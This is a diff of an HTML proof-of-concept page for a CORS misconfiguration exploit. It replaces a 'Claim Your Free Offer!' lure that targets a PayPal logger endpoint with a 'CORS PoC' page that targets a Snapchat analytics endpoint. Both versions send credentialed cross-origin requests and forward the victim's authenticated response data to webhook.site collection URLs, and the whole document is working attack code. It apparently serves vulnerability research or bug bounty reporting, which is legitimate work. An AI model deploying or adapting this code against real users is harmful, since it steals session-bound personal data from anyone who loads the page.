@@ -1,22 +1,28 @@
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Malicious Script</title>
-</head>
-<body>
-  <h1>Claim Your Free Offer!</h1>
-  <script>
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('POST', 'https://www.paypal.com/xoplatform/logger/api/logger?disableSetCookie=true', true);
-    req.withCredentials = true; // Send cookies with the request
-    req.send();
-    
-    function reqListener() {
-      // Exfiltrate sensitive data to an external server
-      location = 'https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717?data=' + encodeURIComponent(this.responseText);
-    }
-  </script>
-</body>
+<html>
+    <body>
+        <h2>CORS PoC</h2>
+        <div id="demo">
+            <button type="button" onclick="cors()">Exploit</button>
+        </div>
+        <script>
+            function cors() {
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    appendToFile(this.responseText);
+                }
+            };
+            xhr.open("POST", "https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client", true);
+            xhr.withCredentials = true;
+            xhr.send();
+            }
+
+            function appendToFile(content) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://webhook.site/55443beb-c33d-4293-bc88-7da51b16342c", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("content=" + encodeURIComponent(content)); 
+            }
+        </script>
+    </body>
 </html>
